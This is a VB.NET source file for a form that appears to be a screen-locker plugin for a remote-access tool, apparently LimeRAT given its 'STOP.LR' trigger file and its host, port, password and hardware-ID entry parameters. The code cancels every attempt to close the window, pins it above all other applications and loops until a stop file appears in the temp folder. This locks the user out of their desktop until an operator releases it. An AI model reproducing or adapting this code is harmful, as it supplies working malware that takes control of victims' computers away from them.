Public Class Form2
    Public Shared F As New Form2
    Public Shared oK As Boolean = False

    Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
        F.Show()
    End Sub
    Private Sub Form2_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        e.Cancel = True
    End Sub

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            If IO.File.Exists(IO.Path.GetTempPath + "/STOP.LR") Then
                IO.File.Delete(IO.Path.GetTempPath + "/STOP.LR")
            End If
        Catch ex As Exception
        End Try

        Dim t1 As New Threading.Thread(AddressOf Wait)
        t1.Start()
        While True
            Windows.Forms.Application.DoEvents()
        End While
    End Sub

    Protected Overrides ReadOnly Property CreateParams() As Windows.Forms.CreateParams ' This code keeps Form2 at the top of the z order always so it's always on top of any other app running
        Get
            Const WS_EX_TOPMOST As Integer = &H8
            Dim cp As Windows.Forms.CreateParams = MyBase.CreateParams
            cp.ExStyle = cp.ExStyle Or WS_EX_TOPMOST
            Return cp
        End Get
    End Property

    Private Sub Wait()
        Try
            Do Until oK = True
                Windows.Forms.Application.DoEvents()
                If IO.File.Exists(IO.Path.GetTempPath + "/STOP.LR") Then
                    Console.Write("True")
                    oK = True
                    Hide()
                    Close()
                Else
                    Threading.Thread.Sleep(500)
                End If
            Loop
            IO.File.Delete(IO.Path.GetTempPath + "/STOP.LR")
        Catch ex As Exception
        End Try
    End Sub

End Class